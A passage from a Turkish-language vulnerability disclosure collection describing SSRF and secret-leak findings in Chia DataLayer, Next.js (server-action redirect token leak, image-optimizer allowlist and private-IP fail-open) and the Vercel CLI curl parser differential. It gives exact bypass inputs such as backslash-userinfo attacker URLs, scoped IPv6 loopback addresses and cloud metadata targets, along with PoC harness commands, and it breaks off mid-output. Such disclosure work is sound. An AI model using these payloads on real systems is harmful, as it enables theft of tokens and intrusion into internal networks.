#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Kurumsal DataLayer Sunucularında İç Ağ (`127.0.0.1`) ve Bulut Metadata (`169.254.169.254`) Erişimi:** Popüler bir DataLayer mağazasına eklenen ayna URL'si `302` ile iç servislere yönlendirme yaparak abone sunucuların iç ağını tetikler.
* **Senaryo B — Otomatik Senkronizasyon Botları Üzerinden İç Ağ Taraması:** Mağazayı takip eden tüm yedekleme (mirror) düğümleri periyodik olarak yönlendirilen iç IP adreslerine istek gönderir.
* **Senaryo C — Yamalı (`GREEN`) Doğrulama:** `allow_redirects=False` ve hedef IP adresinin özel/loopback ağlara karşı doğrulanması ile SSRF tamamen engellenir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect HTTP mirror download handling in chia/data_layer/download_data.py
grep -n -C 10 "session.get" /home/community-user/targets/chia-blockchain/chia/data_layer/download_data.py
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-DL-02": {
    "RED": {
      "mirror_url": "https://mirror.example/store.dat",
      "redirect_location": "http://127.0.0.1:18999/internal-secret",
      "redirect_to_loopback_followed": true,
      "internal_loopback_hit_count": 1
    },
    "GREEN": {
      "redirect_to_loopback_followed": false,
      "internal_loopback_hit_count": 0
    }
  }
}
```

<!-- CHIA-ADVISORIES-END -->

<!-- VERCEL-ADVISORIES-START -->

---

### III.39 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js App Router Server Action Dahili `redirect()` SSRF, `previewModeId` (`x-next-revalidate-tag-token`) Gizli Anahtar Sızıntısı ve Build-ID Atlamalı Aynı Kökenli RSC Flight UXSS (`VERCEL-NEXT-15` / HackerOne `#4152250`) (`CWE-200 / CWE-918 / CWE-345`, CVSS `8.2 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `vercel/next.js` (`npm / Node.js: next`)
* **Etkilenen Sürüm & Bileşenler:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`, `packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201`
* **Zafiyet Sınıfı & Skor:** `CWE-200 / CWE-918 / CWE-345` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `createRedirectRenderResult()` İçinde Eksik `redirect: 'manual'` ve Şema-Bağıl (`//host`) URL Kabulü (`action-handler.js:270-303`):** `forwardActionToWorker()` fonksiyonu `redirect: 'manual'` (satır 175) kullanırken, hemen altındaki `createRedirectRenderResult()` fonksiyonu `await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } })` çağrısını varsayılan `redirect: 'follow'` ile çalıştırır.
2. **Adım 2 — `x-next-revalidate-tag-token` (`previewModeId`) Anahtarının Dış `302` Yönlendirmelerine Otomatik Sızdırılması (`action-handler.js:904-911`):** Bir Server Action `revalidateTag()`, `revalidatePath()` veya `updateTag()` sonrasında `redirect('/api/sso-callback')` çağırdığında, `handleAction()` iç isteğe `x-next-revalidate-tag-token: store.previewProps.previewModeId` başlığını ekler. Üstelik `revalidateTag()` çağrılmasa bile `createRedirectRenderResult()` her `redirect('/internal-path')` çağrısında dış `302` hedefini sunucu tarafında takip eder.
3. **Adım 3 — Monte Edilen HackerOne Yorumu #1 (`RE-EVALUATION-COMMENT-4152250`): Build-ID Kontrolünü Atlayarak Aynı Kökenli RSC Flight Enjeksiyonu (`UXSS`) ve HTTP Yanıt Başlığı Enjeksiyonu:** `handleAction()`, `createRedirectRenderResult()` çağrısından ÖNCE `x-action-redirect: /api/oauth-bounce;push` başlığını ayarladığı için tarayıcı yanıtı aynı kökenli (`same-origin`) kabul eder. İstemci tarafındaki `server-action-reducer.js:161-162` (`if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId())`), dış sunucunun döndürdüğü sahte RSC Flight yanıtında `"b"` alanı bırakılmadığında (`undefined`) Build ID doğrulamasını tamamen atlar ve saldırganın `dangerouslySetInnerHTML` yükünü doğrudan `https://victim-app.com` DOM'una monte ederek **Universal XSS (`UXSS`)** oluşturur!
4. **Adım 4 — Monte Edilen HackerOne Yorumu #2 (`ADDENDUM-SCENARIOS-4152250`): Ayrı Bir Open-Redirect Hatası Olmadan Tasarım Gereği Dış `302` Döndüren Gerçek Next.js Mimarileri:** Çok kiracılı (Multi-Tenant) kurumsal B2B SSO/OIDC giriş akışları (`/api/sso/authorize?tenant=attacker-corp.com`), OAuth 2.0 sağlayıcı onay uç noktaları (`/api/oauth/complete`) ve ödeme/tıklama yönlendiricileri tasarım gereği dış `302` yanıtı üretir.

```javascript
// 1. Server-side internal redirect fetch WITHOUT redirect: 'manual'
// File: node_modules/next/dist/esm/server/app-render/action-handler.js (lines 270-303)
function getAppRelativeRedirectUrl(redirectUrl, basePath, i18n) {
    if (redirectUrl.startsWith('/')) { // BUG: accepts '//attacker.example' and internal routes that 302 externally
        return `${basePath}${redirectUrl}`;
    }
    return new URL(redirectUrl).pathname;
}
async function createRedirectRenderResult(req, res, originalHost, redirectUrl, basePath, staticGenerationStore, workUnitStore) {
    const fetchUrl = new URL(formattedUrl, `http://localhost:${port}`);
    // BUG: Missing `redirect: 'manual'`! Undici follows 3xx hops to external hosts while carrying
    // x-next-revalidate-tag-token (previewModeId) and pipes external Flight body + headers to res!
    const response = await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } });
    if (response.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER) {
        copyResponseHeaders(response, res);
        return new FlightRenderResult(response.body);
    }
}

// 2. Client-side Build ID validation skipped when 'b' is omitted (`responseBuildId === undefined`)
// File: node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js (lines 154-201)
let redirectFlightData = await createFromNextReadableStream(res.body, ...);
const { b: responseBuildId, f: flightData } = redirectFlightData;
if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
    return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Çok Kiracılı Kurumsal SSO / OAuth Giriş Akışında `previewModeId` Gizli Anahtarının Çalınması (Monte Edilen HackerOne `#4152250` Senaryo A):** Kurumsal bir SaaS uygulaması (`https://victim-app.com`), giriş Server Action'ında `revalidateTag('auth-session')` ve `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)` çağırır; bu rota kiracının OIDC sağlayıcısına `302 Found` döndürür. Saldırgan `user@attacker-corp.com` girdiğinde Next.js `302`'yi sunucu içinde takip eder ve `x-next-revalidate-tag-token: <previewModeId>` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`) başlığını doğrudan saldırganın sunucusuna teslim eder.
* **Senaryo B — Çalınan `previewModeId` İle Yetkisiz Küresel On-Demand ISR Önbellek Sıfırlama ve Veritabanı Hizmet Engelleme (Monte Edilen HackerOne `#4152250` Senaryo B):** `try-get-preview-data.js:34` dosyası `req.headers['x-prerender-revalidate'] === previewProps.previewModeId` kontrolü yaptığı için saldırgan çaldığı anahtarı `x-prerender-revalidate` başlığında göndererek tüm önbellekli ISR sayfalarını (`200 OK`, `x-nextjs-cache: REVALIDATED`) sıfırlar.
* **Senaryo C — `revalidateTag()` Olmadan Bile Build-ID Atlamalı Aynı Kökenli RSC Flight Enjeksiyonu ve Universal XSS (`UXSS`) (Monte Edilen HackerOne `#4152250` Yorum #1 & Senaryo C):** Server Action `revalidateTag()` çağırmasa dahi `redirect('/api/oauth-bounce')` çalıştığında `x-action-redirect: /api/oauth-bounce;push` (aynı kökenli) başlığı yazılır ve dış sunucunun döndürdüğü `Content-Type: text/x-component` yanıtı (içinde `"b"` alanı olmadan) `server-action-reducer.js:161` Build ID kontrolünü atlayarak `https://victim-app.com` üzerinde tam **Universal XSS (`UXSS`)** ve keyfi HTTP yanıt başlığı enjeksiyonu (`Access-Control-Allow-Origin`, `Clear-Site-Data`) sağlar.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect createRedirectRenderResult and server-action-reducer in next@16.4.3
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/app-render/action-handler.js | sed -n '270,305p'
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js | sed -n '154,201p'

# 2. Run the Live next@16.4.3 End-to-End Verification Harness (Scenarios A, B, and C + Patch Check)
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-15-nextjs-action-handler-redirect-token-leak-and-flight-injection.patch
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "VERCEL-NEXT-15": {
    "RED": {
      "package_tested": "next@16.4.3",
      "hackerone_report": "#4152250 (with 2 follow-up comments mounted)",
      "prerender_manifest_previewModeId": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
      "attacker_received_x_next_revalidate_tag_token": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
      "leaked_token_matches_prerender_manifest_previewModeId": true,
      "forged_flight_stream_injected_into_action_response": true,
      "response_build_id_field_b": null,
      "client_build_id_check_bypassed": true,
      "injected_cors_header_on_victim_origin": "https://attacker-oauth.example"
    },
    "GREEN": {
      "internal_redirect_fetch_mode": "manual",
      "scheme_relative_redirect_rejected": true,
      "external_hop_followed_by_server": false,
      "attacker_received_x_next_revalidate_tag_token": null,
      "forged_flight_stream_injected_into_action_response": false
    }
  }
}
```

#### 5. Monte Edilen HackerOne Takip Yorumları
### Monte Edilen HackerOne `#4152250` Takip Yorumu #1 (`RE-EVALUATION-COMMENT-4152250.md`)

1. **Ayrı Bir Open-Redirect Hatasına Gerek Kalmadan `302` Hedefinin Gerçek Next.js Uygulamalarında Neden Saldırgan Kontrolünde Olduğu:**
   - **Desen 1 — Çok Kiracılı (Multi-Tenant) Kurumsal SSO / OIDC Keşfi:** `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)` çağrısı kiracının kendi IdP sunucusuna (`https://idp.attacker-corp.com/oauth2/authorize`) `302 Found` döndürür.
   - **Desen 2 — OAuth 2.0 / OIDC Sağlayıcı Onay Server Action'ları:** `redirect('/api/oauth/complete?session=...')` kayıtlı OAuth istemcisinin `redirect_uri` adresine `302 Found` döndürür.
   - **Desen 3 — Giden Bağlantı / Ödeme Yönlendiricileri:** `redirect(\`/out?dest=${partnerUrl}\`)` dış hedefe `302 Found` döndürür.
2. **`revalidateTag()` Çağrılmasa Bile Oluşan İkincil Kritik Etki — Aynı Kökenli RSC Flight Akışı Ele Geçirme ve Universal XSS (`UXSS`):**
   - `handleAction()` (`action-handler.js:1007`), `createRedirectRenderResult()` çalışmadan ÖNCE `x-action-redirect: /api/oauth-bounce;push` başlığını ayarlar.
   - İstemci tarafındaki `server-action-reducer.js:161-162` dosyasında `if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId())` kontrolü yer alır. Dış sunucu RSC Flight yanıtında `"b"` alanını göndermediğinde (`responseBuildId === undefined`), Build ID doğrulaması tamamen atlanır ve `dangerouslySetInnerHTML` içeren sahte Virtual DOM doğrudan `https://victim-app.com` içerisine monte edilerek **Universal XSS (`UXSS`)** tetiklenir!
3. **Keyfi HTTP Yanıt Başlığı Enjeksiyonu (`copyResponseHeaders`):**
   - `actionsForbiddenHeaders` (`action-handler.js:230-241`) yalnızca 9 başlığı filtrelediği için dış sunucu `https://victim-app.com` yanıtına `Access-Control-Allow-Origin: https://attacker.example`, `Access-Control-Allow-Credentials: true` ve `Clear-Site-Data: "storage"` enjekte edebilir.

### Monte Edilen HackerOne `#4152250` Takip Yorumu #2 (`ADDENDUM-SCENARIOS-4152250.md`)

- **Senaryo A (`previewModeId` Çalınması):** Canlı `next@16.4.3` üzerinde `"leaked_token_matches_prerender_manifest_previewModeId": true` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`) doğrulandı.
- **Senaryo B (Küresel On-Demand ISR Önbellek Sıfırlama):** Çalınan `previewModeId` ile `x-prerender-revalidate` başlığı gönderildiğinde önbellekli ISR rotalarının sıfırlandığı doğrulandı.
- **Senaryo C (Build-ID Atlamalı Aynı Kökenli RSC Flight Enjeksiyonu & UXSS):** `response_build_id_field_b: null`, `client_build_id_check_bypassed: true` ve `injected_cors_header_on_victim_origin: "https://attacker-oauth.example"` canlı olarak kanıtlandı.


---

### III.40 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js `/_next/image` (`fetchExternalImage`) `3xx` Yönlendirme `remotePatterns` İzin Listesi Atlaması ve `isPrivateIp()` Fail-Open Loopback/İç Ağ SSRF (`VERCEL-NEXT-09` / HackerOne `#4152265`) (`CWE-918 / CWE-863`, CVSS `7.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `vercel/next.js` (`npm / Node.js: next`)
* **Etkilenen Sürüm & Bileşenler:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/image-optimizer.ts:696-729`, `packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`)
* **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-863` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `remotePatterns` Kontrolünün Yalnızca İlk İstek Hopunda Yapılması (`image-optimizer.js:586-615`):** `validateParams()` fonksiyonu `hasMatch(domains, remotePatterns, href)` kontrolünü yalnızca ilk `/_next/image?url=...` parametresinde çalıştırır. İzin verilen sunucu `301`/`302`/`307`/`308` döndürdüğünde `fetchExternalImage()` yeni `Location` adresini yalnızca `validateUrl()` fonksiyonuna sokar; `hasMatch()` kontrolünü tekrar çağırmaz. Böylece hem **aynı sunucu içindeki dizin kısıtlamaları** (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) hem de **farklı alan adı kısıtlamaları** tamamen aşılır.
2. **Adım 2 — Monte Edilen HackerOne Yorumu #1 (`RE-EVALUATION-COMMENT-4152265`): İlk Hop İçin Ele Geçirilmiş Sunucuya Neden Gerek Yoktur:** Gravatar (`?d=https://...`), Cloudinary ve çok kiracılı S3 / R2 / Supabase Storage / Vercel Blob kovaları tasarım gereği `301`/`302` yönlendirmesi üretir.
3. **Adım 3 — Monte Edilen HackerOne Yorumu #1 (`RE-EVALUATION-COMMENT-4152265`): NAT64 Olmadan Standart Linux/Docker Çekirdeğinde Doğrudan `127.0.0.1` Soketine Bağlanma (`if (!ipaddr.isValid(ip)) return false`):** `next/dist/compiled/ipaddr.js` içindeki IPv6 `zoneIndex` düzenli ifadesi (`const o = "%[0-9a-z]{1,}"`) tire (`-`), alt çizgi (`_`) ve nokta (`.`) karakterlerini reddeder. Standart Linux/Docker/K8s sunucularındaki `br-1a49f5828144`, `docker_gwbridge`, `cni-podman0` gibi arayüzlerde `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` çekirdekte başarılı olur, `ipaddr.isValid()` `false` döner, `isPrivateIp()` **fail-open (`return false`)** yapar ve Node.js `http.get` doğrudan `127.0.0.1` loopback soketine bağlanarak iç yanıtı sızdırır!
4. **Adım 4 — Monte Edilen HackerOne Yorumu #1 & #2 (`ADDENDUM-SCENARIOS-4152265`): WHATWG `URL` vs. `ipaddr.js` RFC 4291 `::7f00:1` Ayrıştırıcı Farkı ve RFC 8215 `64:ff9b:1::/48` NAT64 Atlaması:** `Location: http://[::127.0.0.1]:8080/internal.png` adresi WHATWG `new URL()` tarafından `::7f00:1` olarak normalize edilir; `ipaddr.parse('::7f00:1').range()` ve `ipaddr.parse('64:ff9b:1::a9fe:a9fe').range()` `'unicast'` döndürdüğü için `isPrivateIp()` `false` verir!

```javascript
// 1. Missing matchRemotePattern / hasMatch check on 3xx redirects in fetchExternalImage()
// File: node_modules/next/dist/esm/server/image-optimizer.js (lines 586-615)
if (res.status >= 300 && res.status < 400 && res.headers.get('location')) {
    if (redirectCount >= maxRedirects) {
        throw new ImageError(400, '"url" parameter reached maxRedirects');
    }
    const redirectUrl = new URL(res.headers.get('location'), href).href;
    const parsedRedirectUrl = new URL(redirectUrl);
    // BUG 1 (09A): Only calls validateUrl(parsedRedirectUrl); NEVER re-checks hasMatch(domains, remotePatterns, parsedRedirectUrl)!
    await validateUrl(parsedRedirectUrl);
    return fetchExternalImage(redirectUrl, dangerouslyAllowLocalIP, redirectCount + 1);
}

// 2. isPrivateIp() fails open on hyphenated Linux IPv6 zone indices & RFC 4291 / RFC 8215 ranges
// File: node_modules/next/dist/esm/server/lib/find-root.js
function isPrivateIp(ip) {
    if (!ipaddr.isValid(ip)) {
        return false; // BUG 2 (09B): Fail-open! "::ffff:127.0.0.1%br-1a49f5828144" -> isValid=false -> returns false!
    }
    const addr = ipaddr.parse(ip);
    const range = addr.range(); // BUG 3 (09B): "::7f00:1" and "64:ff9b:1::a9fe:a9fe" -> range="unicast" -> returns false!
    return PRIVATE_IP_RANGES.includes(range);
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Aynı Sunucu Üzerinde `pathname` Kısıtlamasını Atlama (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) (Monte Edilen HackerOne `#4152265` Senaryo A):** Uygulama `remotePatterns` ile yalnızca `/public-avatars/**` dizinine izin verirken, bu dizindeki bir `302` yönlendirmesi `fetchExternalImage()` fonksiyonunu `/private-kyc-docs/passport-scan.png` adresine taşır ve özel belgeyi `200 OK` olarak sızdırır.
* **Senaryo B — İzinli Avatar/Depolama Servisi Üzerinden İzin Listesi Dışındaki Sunuculara SSRF Sıçraması (Monte Edilen HackerOne `#4152265` Yorum #1 & Senaryo B):** Gravatar (`?d=https://...`) veya çok kiracılı S3/Supabase/R2 kovası üzerinden verilen `301`/`302` yanıtı ile `remotePatterns` izin listesi tamamen atlanarak izin verilmeyen dış/iç sunuculardan görüntü çekilir.
* **Senaryo C — Zincirleme `09A -> 09B` İle Standart Linux/Docker Çekirdeğinde Doğrudan `127.0.0.1` Loopback Soketine Bağlanma ve SSRF (Monte Edilen HackerOne `#4152265` Yorum #1 & Senaryo C):** İzinli ilk hop `Location: http://[::ffff:127.0.0.1%25br-1a49f5828144]:45829/admin-badge.png` (veya `::7f00:1` / `64:ff9b:1::a9fe:a9fe`) döndürdüğünde `isPrivateIp()` fail-open (`return false`) yapar ve Node.js `http.get` doğrudan `127.0.0.1` loopback soketine bağlanarak iç servis yanıtını sızdırır!

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect fetchExternalImage and isPrivateIp in next@16.4.3
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/image-optimizer.js | sed -n '586,615p'
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/lib/find-root.js | sed -n '100,145p'

# 2. Run the Live next@16.4.3 End-to-End Verification Harness (09A + 09B + Linux Loopback Socket Proof)
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-09-nextjs-image-optimizer-redirect-and-nat64-ssrf.patch
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "VERCEL-NEXT-09": {
    "RED": {
      "package_tested": "next@16.4.3",
      "hackerone_report": "#4152265 (with 2 follow-up comments mounted)",
      "same_host_pathname_bypass_status": 200,
      "cross_host_allowlist_bypass_status": 200,
      "scoped_loopback_input": "::ffff:127.0.0.1%br-1a49f5828144",
      "ipaddr_isValid": false,
      "nextjs_isPrivateIp_returned": false,
      "loopback_server_hit": true,
      "remote_address_seen_by_server": "::ffff:127.0.0.1",
      "rfc4291_ipv4_compatible_isPrivateIp": false,
      "rfc8215_local_nat64_isPrivateIp": false
    },
    "GREEN": {
      "redirect_hop_rechecks_hasMatch_remotePatterns": true,
      "invalid_or_hyphenated_zone_ip_fails_closed": true,
      "rfc4291_and_rfc8215_blocked": true,
      "loopback_server_hit": false
    }
  }
}
```

#### 5. Monte Edilen HackerOne Takip Yorumları
### Monte Edilen HackerOne `#4152265` Takip Yorumu #1 (`RE-EVALUATION-COMMENT-4152265.md`)

1. **`remotePatterns` Atlaması İçin Ele Geçirilmiş Sunucuya Gerek Yoktur (`FINDING-09A`):**
   - **Vektör A (Aynı Sunucu Üzerinde `pathname` Kısıtlamasını Atlama):** Aynı alan adında `/public-avatars/**` kısıtlamasını aşarak `/private-kyc-docs/passport-scan.png` dosyasını okur.
   - **Vektör B (Popüler İzinli Görsel Servislerindeki Yerleşik Yönlendiriciler):** Gravatar (`?d=https%3A%2F%2F...`), Cloudinary ve çok kiracılı S3 / R2 / Supabase Storage / Vercel Blob kovaları herhangi bir sunucu ele geçirilmesine gerek olmadan doğal olarak `301`/`302` yönlendirmesi üretir.
2. **NAT64 Gerekmeden `isPrivateIp()` Fail-Open (`if (!ipaddr.isValid(ip)) return false`) İle Doğrudan Linux `127.0.0.1` Soketine Bağlanma:**
   - `next/dist/compiled/ipaddr.js` içindeki IPv6 `zoneIndex` regex'i (`const o = "%[0-9a-z]{1,}"`) tire (`-`), alt çizgi (`_`) ve nokta (`.`) karakterlerini reddeder.
   - Standart Linux / Docker / Kubernetes ortamlarındaki `br-1a49f5828144`, `docker_gwbridge`, `cni-podman0`, `flannel.1` arayüzlerinde `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` çekirdek seviyesinde başarılı olur, `ipaddr.isValid()` `false` döner, `isPrivateIp()` **fail-open (`return false`)** yapar ve Node.js `http.get` doğrudan `127.0.0.1` TCP soketine bağlanır!
3. **WHATWG `URL` vs. `ipaddr.js` RFC 4291 (`::7f00:1` & `0:0:0:0:0:0:127.0.0.1`) Ayrıştırıcı Farkı:**
   - `new URL('http://[::127.0.0.1]')` adresi `::7f00:1` olarak normalize edilir ve `ipaddr.parse('::7f00:1').range()` `'unicast'` döndürdüğü için `isPrivateIp()` `false` verir!

### Monte Edilen HackerOne `#4152265` Takip Yorumu #2 (`ADDENDUM-SCENARIOS-4152265.md`)

- **Senaryo A (Aynı Sunucu `pathname` Atlaması):** `/public-avatars/redirect-to-private` -> `/private-kyc-docs/passport-scan.png` (`200 OK`, `68 byte`) doğrulandı.
- **Senaryo B (Farklı Sunucu İzin Listesi Atlaması):** `allowed-cdn.example` -> `unapproved-internal.example` (`200 OK`) doğrulandı.
- **Senaryo C (`09A -> 09B` Zinciri İle Doğrudan `127.0.0.1` Loopback Soketine Bağlanma):** Canlı `next@16.4.3` üzerinde `loopback_server_hit: true`, `remote_address_seen_by_server: "::ffff:127.0.0.1"`, `status: 200`, `bytes_exfiltrated: 68` kanıtlandı.


---

### III.41 — vercel/vercel (`vercel <= 65.4.0 (verified on published npm vercel@65.4.0)`) — Vercel CLI (`vercel@65.4.0`) `vercel curl` / `vercel http` WHATWG `URL` vs. `libcurl` Ters Eğik Çizgi / Süslü Parantez Ayrıştırıcı Farkı İle Canlı Bearer Token ve `x-vercel-protection-bypass` Sızıntısı (`VERCEL-CLI-07`) (`CWE-200 / CWE-436`, CVSS `8.2 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `vercel/vercel` (`npm / Node.js: vercel`)
* **Etkilenen Sürüm & Bileşenler:** `<= 65.4.0 (verified on published npm vercel@65.4.0)` — `packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`, `packages/cli/src/commands/http-cli/index.ts`
* **Zafiyet Sınıfı & Skor:** `CWE-200 / CWE-436` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — WHATWG `new URL()` İle `libcurl` (`curl_url_set`) Arasındaki Ters Eğik Çizgi (`\\@`) Ayrıştırıcı Farkı (`packages/cli/src/commands/curl/utils.ts:179-216`):** `constructFullUrl(baseUrl, path)` fonksiyonu `const url = new URL(path, baseUrl); if (url.origin !== baseUrl) throw ...` kontrolünü yaptıktan sonra normalize edilmiş `url.href` yerine **ham metin birleştirmesini** (`return \`${baseUrl}${normalizedPath}\``) döndürür. `path` olarak `\\@attacker.example/collect` verildiğinde WHATWG `new URL()` bunu aynı kökenli bir dizin yolu sayarken, `/usr/bin/curl` ikili dosyasına giden `https://my-app.vercel.app\\@attacker.example/collect` dizgesi `libcurl` tarafından `my-app.vercel.app\\` kullanıcı adıyla **`attacker.example`** sunucusuna yapılan bir istek olarak ayrıştırılır!
2. **Adım 2 — `libcurl` Globbing (`{a,b}`) ve `--next` Bayrak Farkı (`utils.ts:34-42`):** `@attacker.example/{a,b}` yolu WHATWG `URL` tarafından bağıl dizin olarak görülürken `libcurl` globbing motoru tarafından dış sunucu isteğine dönüştürülür.
3. **Adım 3 — Canlı `Authorization: Bearer` ve `x-vercel-protection-bypass` Sırlarının Dış Sunucuya Gönderilmesi (`utils.ts:74-96`):** `vercel curl`, oluşturulan `curl` sürecine otomatik olarak `--header "Authorization: Bearer <VERCEL_TOKEN>"` ve `x-vercel-protection-bypass` başlıklarını eklediği için tüm kimlik bilgileri doğrudan saldırganın sunucusuna akar.

```typescript
// File: packages/cli/src/commands/curl/utils.ts (lines 179-216)
export function constructFullUrl(baseUrl: string, path: string): string {
  const normalizedPath = path.startsWith('/') ? path : `/${path}`;
  const url = new URL(normalizedPath, baseUrl);
  if (url.origin !== baseUrl) {
    throw new Error(`Invalid path "${path}": must be a relative path, not a full URL`);
  }
  // BUG: Returns raw string concatenation instead of normalized url.href, and does not
  // pass '--globoff' to curl! Input '\\@attacker.com/p' passes new URL() origin check
  // but libcurl parses 'baseUrl\\' as userinfo and 'attacker.com' as target host!
  return `${baseUrl}${normalizedPath}`;
}
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — CI/CD PR Önizleme Test Hattında Canlı Vercel Token ve Bypass Sırrının Çalınması:** CI/CD hattında çalışan `vercel curl "$PREVIEW_PATH"` komutuna `\\@127.0.0.1:41992/exfil` verildiğinde `constructFullUrl()` kontrolünden geçer; ancak `/usr/bin/curl` doğrudan saldırgan sunucusuna bağlanarak `Authorization: Bearer vcp_live_...` ve `x-vercel-protection-bypass` sırlarını teslim eder.
* **Senaryo B — Geliştirici Terminali veya AI Ajanı Üzerinden Kimlik Bilgisi Sızıntısı:** Korumalı bir Vercel dağıtımını test eden geliştirici veya AI ajanı `vercel curl '\@logs-collector.example/api/debug'` çalıştırdığında canlı Vercel API anahtarı dış sunucuya sızar.
* **Senaryo C — Otomatik Üretilen Proje Geneli Bypass Sırrının Sızması (`FINDING-07B`):** `ensureProtectionBypassSecret()` fonksiyonu `PATCH /v10/projects/{id}/protection-bypass` ile kalıcı bir proje bypass sırrı üretir ve aynı istekte dış sunucuya sızdırır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect constructFullUrl in published vercel@65.4.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/vercel/dist/commands/curl/utils.js | sed -n '1,180p'

# 2. Run the Live vercel@65.4.0 End-to-End Verification Harness against /usr/bin/curl
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-07-cli-curl-flag-and-url-hardening.patch
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "VERCEL-CLI-07": {
    "RED": {
      "package_tested": "vercel@65.4.0",
      "curl_binary": "/usr/bin/curl 8.5.0",
